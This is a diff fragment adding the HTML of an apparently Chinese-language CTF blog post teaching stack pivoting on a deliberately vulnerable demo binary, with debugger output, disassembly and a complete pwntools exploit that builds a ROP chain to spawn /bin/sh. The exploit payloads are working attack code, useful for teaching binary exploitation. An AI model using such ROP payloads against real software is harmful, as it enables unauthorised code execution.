+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Input:&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x30</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>使用以下命令编译</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gcc -fno-stack-protector -no-pie -z lazy -O0 demo.c -o demo
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>编译完成后，开始尝试解题
+发现这里read的大小只够一个返回地址，但是我们的ROP链显然不止这么长，就可以开始计算栈迁移
+先vmmap看看哪里可以当作迁移的目的地</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">vmmap</span>
+</span></span><span class="line"><span class="cl"><span class="n">LEGEND</span><span class="p">:</span> <span class="n">STACK</span> <span class="o">|</span> <span class="n">HEAP</span> <span class="o">|</span> <span class="n">CODE</span> <span class="o">|</span> <span class="n">DATA</span> <span class="o">|</span> <span class="n">WX</span> <span class="o">|</span> <span class="n">RODATA</span>
+</span></span><span class="line"><span class="cl">             <span class="n">Start</span>                <span class="n">End</span> <span class="n">Perm</span>     <span class="n">Size</span>  <span class="n">Offset</span> <span class="ne">File</span> <span class="p">(</span><span class="n">set</span> <span class="n">vmmap</span><span class="o">-</span><span class="n">prefer</span><span class="o">-</span><span class="n">relpaths</span> <span class="n">on</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">          <span class="mh">0x400000</span>           <span class="mh">0x401000</span> <span class="n">r</span><span class="o">--</span><span class="n">p</span>     <span class="mi">1000</span>       <span class="mi">0</span> <span class="n">piv</span>
+</span></span><span class="line"><span class="cl">          <span class="mh">0x401000</span>           <span class="mh">0x402000</span> <span class="n">r</span><span class="o">-</span><span class="n">xp</span>     <span class="mi">1000</span>    <span class="mi">1000</span> <span class="n">piv</span>
+</span></span><span class="line"><span class="cl">          <span class="mh">0x402000</span>           <span class="mh">0x403000</span> <span class="n">r</span><span class="o">--</span><span class="n">p</span>     <span class="mi">1000</span>    <span class="mi">2000</span> <span class="n">piv</span>
+</span></span><span class="line"><span class="cl">          <span class="mh">0x403000</span>           <span class="mh">0x404000</span> <span class="n">r</span><span class="o">--</span><span class="n">p</span>     <span class="mi">1000</span>    <span class="mi">2000</span> <span class="n">piv</span>
+</span></span><span class="line"><span class="cl">          <span class="mh">0x404000</span>           <span class="mh">0x405000</span> <span class="n">rw</span><span class="o">-</span><span class="n">p</span>     <span class="mi">1000</span>    <span class="mi">3000</span> <span class="n">piv</span>
+</span></span><span class="line"><span class="cl">          <span class="mh">0x405000</span>           <span class="mh">0x426000</span> <span class="n">rw</span><span class="o">-</span><span class="n">p</span>    <span class="mi">21000</span>       <span class="mi">0</span> <span class="p">[</span><span class="n">heap</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x7ffff7c00000</span>     <span class="mh">0x7ffff7c28000</span> <span class="n">r</span><span class="o">--</span><span class="n">p</span>    <span class="mi">28000</span>       <span class="mi">0</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="o">.</span><span class="n">so</span><span class="o">.</span><span class="mi">6</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x7ffff7c28000</span>     <span class="mh">0x7ffff7db0000</span> <span class="n">r</span><span class="o">-</span><span class="n">xp</span>   <span class="mi">188000</span>   <span class="mi">28000</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="o">.</span><span class="n">so</span><span class="o">.</span><span class="mi">6</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x7ffff7db0000</span>     <span class="mh">0x7ffff7dff000</span> <span class="n">r</span><span class="o">--</span><span class="n">p</span>    <span class="mi">4</span><span class="n">f000</span>  <span class="mi">1</span><span class="n">b0000</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="o">.</span><span class="n">so</span><span class="o">.</span><span class="mi">6</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x7ffff7dff000</span>     <span class="mh">0x7ffff7e03000</span> <span class="n">r</span><span class="o">--</span><span class="n">p</span>     <span class="mi">4000</span>  <span class="mi">1</span><span class="n">fe000</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="o">.</span><span class="n">so</span><span class="o">.</span><span class="mi">6</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x7ffff7e03000</span>     <span class="mh">0x7ffff7e05000</span> <span class="n">rw</span><span class="o">-</span><span class="n">p</span>     <span class="mi">2000</span>  <span class="mi">202000</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="o">.</span><span class="n">so</span><span class="o">.</span><span class="mi">6</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x7ffff7e05000</span>     <span class="mh">0x7ffff7e12000</span> <span class="n">rw</span><span class="o">-</span><span class="n">p</span>     <span class="n">d000</span>       <span class="mi">0</span> <span class="p">[</span><span class="n">anon_7ffff7e05</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x7ffff7fad000</span>     <span class="mh">0x7ffff7fb0000</span> <span class="n">rw</span><span class="o">-</span><span class="n">p</span>     <span class="mi">3000</span>       <span class="mi">0</span> <span class="p">[</span><span class="n">anon_7ffff7fad</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x7ffff7fbd000</span>     <span class="mh">0x7ffff7fbf000</span> <span class="n">rw</span><span class="o">-</span><span class="n">p</span>     <span class="mi">2000</span>       <span class="mi">0</span> <span class="p">[</span><span class="n">anon_7ffff7fbd</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x7ffff7fbf000</span>     <span class="mh">0x7ffff7fc3000</span> <span class="n">r</span><span class="o">--</span><span class="n">p</span>     <span class="mi">4000</span>       <span class="mi">0</span> <span class="p">[</span><span class="n">vvar</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x7ffff7fc3000</span>     <span class="mh">0x7ffff7fc5000</span> <span class="n">r</span><span class="o">-</span><span class="n">xp</span>     <span class="mi">2000</span>       <span class="mi">0</span> <span class="p">[</span><span class="n">vdso</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x7ffff7fc5000</span>     <span class="mh">0x7ffff7fc6000</span> <span class="n">r</span><span class="o">--</span><span class="n">p</span>     <span class="mi">1000</span>       <span class="mi">0</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mf">64.</span><span class="n">so</span><span class="o">.</span><span class="mi">2</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x7ffff7fc6000</span>     <span class="mh">0x7ffff7ff1000</span> <span class="n">r</span><span class="o">-</span><span class="n">xp</span>    <span class="mi">2</span><span class="n">b000</span>    <span class="mi">1000</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mf">64.</span><span class="n">so</span><span class="o">.</span><span class="mi">2</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x7ffff7ff1000</span>     <span class="mh">0x7ffff7ffb000</span> <span class="n">r</span><span class="o">--</span><span class="n">p</span>     <span class="n">a000</span>   <span class="mi">2</span><span class="n">c000</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mf">64.</span><span class="n">so</span><span class="o">.</span><span class="mi">2</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x7ffff7ffb000</span>     <span class="mh">0x7ffff7ffd000</span> <span class="n">r</span><span class="o">--</span><span class="n">p</span>     <span class="mi">2000</span>   <span class="mi">36000</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mf">64.</span><span class="n">so</span><span class="o">.</span><span class="mi">2</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x7ffff7ffd000</span>     <span class="mh">0x7ffff7fff000</span> <span class="n">rw</span><span class="o">-</span><span class="n">p</span>     <span class="mi">2000</span>   <span class="mi">38000</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mf">64.</span><span class="n">so</span><span class="o">.</span><span class="mi">2</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x7ffffffde000</span>     <span class="mh">0x7ffffffff000</span> <span class="n">rw</span><span class="o">-</span><span class="n">p</span>    <span class="mi">21000</span>       <span class="mi">0</span> <span class="p">[</span><span class="n">stack</span><span class="p">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>显然0x404000到0x405000是一个可读可写的段，在这里即可，我们从0x404800开始写ROP链
+构造如下payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x404830</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">read_addr</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里溢出到rbp的值的时候，我们修改为0x404830,但为什么是0x404830而不是0x404800
+因为这里rbp是作为一个基准使用的，当我们执行read时</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="kr">__fastcall</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">_BYTE</span> <span class="n">buf</span><span class="p">[</span><span class="mi">48</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-30h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Input:&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x40uLL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">00000000004011</span><span class="nf">B8</span>                 <span class="nv">lea</span>     <span class="nb">rax</span><span class="p">,</span> <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">buf</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">00000000004011</span><span class="nf">BC</span>                 <span class="nv">mov</span>     <span class="nb">edx</span><span class="p">,</span> <span class="mh">40h</span> <span class="c1">; &#39;@&#39;  ; nbytes</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">00000000004011</span><span class="nf">C1</span>                 <span class="nv">mov</span>     <span class="nb">rsi</span><span class="p">,</span> <span class="nb">rax</span>        <span class="c1">; buf</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">00000000004011</span><span class="nf">C4</span>                 <span class="nv">mov</span>     <span class="nb">edi</span><span class="p">,</span> <span class="mi">0</span>          <span class="c1">; fd</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">00000000004011</span><span class="nf">C9</span>                 <span class="nv">call</span>    <span class="nv">_read</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>从ida里看到，事实上这里是从rbp - 0x30的地方开始read,所以这样刚好可以从0x404800开始写ROP链</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x404830</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">read_addr</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>当第一段payload输入结束后，程序执行leave，此时rsp被移动到当前rbp的位置，并将rbp移动到0x404830，retn执行，程序流运行到写的再次read的地方(0x4011b8)
+现在可以开始写入以下payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x08</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x404800</span> <span class="o">-</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">leave_ret</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里可以预先计算到，binsh的地址我们打算放在0x404820的位置，并且再次迁移rbp到0x4047f8,这样就可以使得前面写的ROP链刚好位于rbp后方的返回地址的位置，当执行leave ret后即可执行刚写的ROP链</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pwndbg&gt; telescope 0x404800
+</span></span><span class="line"><span class="cl">00:0000│ rsi 0x404800 —▸ 0x40117e (gift+8) ◂— pop rdi
+</span></span><span class="line"><span class="cl">01:0008│-028 0x404808 —▸ 0x404820 ◂— 0x68732f6e69622f /* &#39;/bin/sh&#39; */
+</span></span><span class="line"><span class="cl">02:0010│-020 0x404810 —▸ 0x40117f (gift+9) ◂— ret
+</span></span><span class="line"><span class="cl">03:0018│-018 0x404818 —▸ 0x401195 (backdoor+18) ◂— call system@plt
+</span></span><span class="line"><span class="cl">04:0020│-010 0x404820 ◂— 0x68732f6e69622f /* &#39;/bin/sh&#39; */
+</span></span><span class="line"><span class="cl">05:0028│-008 0x404828 ◂— 0x6161616261616161 (&#39;aaaabaaa&#39;)
+</span></span><span class="line"><span class="cl">06:0030│ rbp 0x404830 —▸ 0x4047f8 ◂— 0
+</span></span><span class="line"><span class="cl">07:0038│+008 0x404838 —▸ 0x4011cf (main+50) ◂— leave
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="exp">exp
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span><span class="p">,</span><span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./piv&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">dbg</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pause</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x40117E</span>
+</span></span><span class="line"><span class="cl"><span class="n">read_addr</span> <span class="o">=</span> <span class="mh">0x4011B8</span>
+</span></span><span class="line"><span class="cl"><span class="n">system_addr</span> <span class="o">=</span> <span class="mh">0x401195</span>
+</span></span><span class="line"><span class="cl"><span class="n">ret_addr</span> <span class="o">=</span> <span class="mh">0x40117F</span>
+</span></span><span class="line"><span class="cl"><span class="n">leave_ret</span> <span class="o">=</span> <span class="mh">0x4011CF</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Input:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x404830</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">read_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">binsh_addr</span> <span class="o">=</span> <span class="mh">0x404820</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x08</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x404800</span> <span class="o">-</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">leave_ret</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/ctf/">CTF</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/geek-challenge-2025-wp/">
+        
+        
+            <div class="article-image">
+                <img src="/p/geek-challenge-2025-wp/background.0ad88b7fa74a81463fd67f626acb46fb.0ad88b7fa74a81463fd67f626acb46fb_hu_398d590aa2f5ece0.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Geek Challenge 2025 WP"
+                        
+                        data-hash="md5-CtiLf6dKgUY/1n9iastG&#43;w==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Geek Challenge 2025 WP</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2025 - 
+        
+        2026 Converter258
+    </section>
+    
+
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.76af3192973d9c142d10a7a0f4711d6028f1034e8c3f81ae6a032fdf70ff1ea5.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<style>
+    #TableOfContents > ul, ol {
+        ul, ol {
+            display: none;
+        }
+        .open {
+            display: block;
+        }
+    }
+</style>
+
+<script>
+    function initTocHide() {
+        
+        let toc = document.querySelector(".widget--toc");
+        if (!toc) {
+            return;
+        }
+        
